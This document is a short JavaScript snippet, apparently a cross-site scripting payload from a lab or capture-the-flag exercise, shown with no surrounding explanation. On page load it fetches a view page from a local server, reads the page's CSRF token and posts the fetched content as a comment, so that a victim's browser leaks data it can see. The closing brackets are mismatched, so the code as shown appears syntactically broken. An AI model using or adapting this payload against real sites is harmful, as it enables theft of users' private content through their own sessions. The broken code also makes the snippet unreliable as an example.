window.onload = function () {

fetch("http://127.0.0.1:9000/view/3981cef4-9e4c-4cc9-bed1-3ea0f6d761a1").then((res) => {
	return res.text();
}).then(data => {
	var csrf = document.querySelector("[name=csrfmiddlewaretoken]").value;
	var formData = new FormData();

	formData.append("csrfmiddlewaretoken", csrf);
	formData.append("creator", "fromBot2");
	formData.append("body", data);

	fetch("http://127.0.0.1:9000/comment/51673b2f-7faa-46ec-ae3b-f51d2d94e735",{
		method: 'POST',
		credentials: 'omit',
		body: formData
	});
};

});

}
